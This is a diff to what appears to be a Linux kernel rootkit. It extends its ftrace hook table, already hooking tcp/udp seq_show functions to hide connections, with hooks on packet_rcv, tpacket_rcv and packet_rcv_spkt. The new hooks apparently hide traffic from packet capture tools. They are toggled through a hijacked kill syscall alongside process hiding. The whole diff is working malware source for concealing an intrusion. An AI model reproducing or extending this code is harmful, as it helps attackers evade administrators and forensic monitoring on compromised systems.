@@ -44,7 +44,10 @@ static struct ftrace_hook ACTIVE_HOOKS[] = {
     HOOK("tcp4_seq_show", hack_tcp4_seq_show, &orig_tcp4_seq_show),
     HOOK("tcp6_seq_show", hack_tcp6_seq_show, &orig_tcp6_seq_show),
     HOOK("udp4_seq_show", hack_udp4_seq_show, &orig_udp4_seq_show),
-    HOOK("udp6_seq_show", hack_udp6_seq_show, &orig_udp6_seq_show)
+    HOOK("udp6_seq_show", hack_udp6_seq_show, &orig_udp6_seq_show),
+    HOOK("packet_rcv", hack_packet_rcv, &orig_packet_rcv),
+    HOOK("tpacket_rcv", hack_tpacket_rcv, &orig_tpacket_rcv),
+    HOOK("packet_rcv_spkt", hack_packet_rcv_spkt, &orig_packet_rcv_spkt)
 };
 #else
 static asmlinkage long hack_kill(pid_t pid, int sig);
@@ -58,7 +61,10 @@ static struct ftrace_hook ACTIVE_HOOKS[] = {
     HOOK("tcp4_seq_show", hack_tcp4_seq_show, &orig_tcp4_seq_show),
     HOOK("tcp6_seq_show", hack_tcp6_seq_show, &orig_tcp6_seq_show),
     HOOK("udp4_seq_show", hack_udp4_seq_show, &orig_udp4_seq_show),
-    HOOK("udp6_seq_show", hack_udp6_seq_show, &orig_udp6_seq_show)
+    HOOK("udp6_seq_show", hack_udp6_seq_show, &orig_udp6_seq_show),
+    HOOK("packet_rcv", hack_packet_rcv, &orig_packet_rcv),
+    HOOK("tpacket_rcv", hack_tpacket_rcv, &orig_tpacket_rcv),
+    HOOK("packet_rcv_spkt", hack_packet_rcv_spkt, &orig_packet_rcv_spkt)
 };
 #endif
 #ifdef PTREGS_SYSCALL_STUB
@@ -105,6 +111,15 @@ static asmlinkage long hack_kill(const struct pt_regs *regs){ // pretty self exp
         }
         if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"udp6_seq_show") == 1){
             printk(KERN_ERR "error hooking udp6_seq_show\n");
+        }
+        if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE, "packet_rcv") == 1){
+            printk(KERN_ERR "error hooking packet_rcv\n");
+        }
+        if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE, "tpacket_rcv") == 1){
+            printk(KERN_ERR "error hooking tpacket_rcv\n");
+        }
+        if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"packet_rcv_spkt") == 1){
+            printk(KERN_ERR "error hooking packet_rcv_spkt\n");
         }
         switch_net_hook();
         switch_hide_process();
@@ -158,6 +173,15 @@ static asmlinkage long hack_kill(pid_t pid, int sig){
         }
         if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"udp6_seq_show") == 1){
             printk(KERN_ERR "error hooking udp6_seq_show\n");
+        }
+        if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE, "packet_rcv") == 1){
+            printk(KERN_ERR "error hooking packet_rcv\n");
+        }
+        if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE, "tpacket_rcv") == 1){
+            printk(KERN_ERR "error hooking tpacket_rcv\n");
+        }
+        if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"packet_rcv_spkt") == 1){
+            printk(KERN_ERR "error hooking packet_rcv_spkt\n");
         }
         switch_net_hook();
         switch_hide_process();
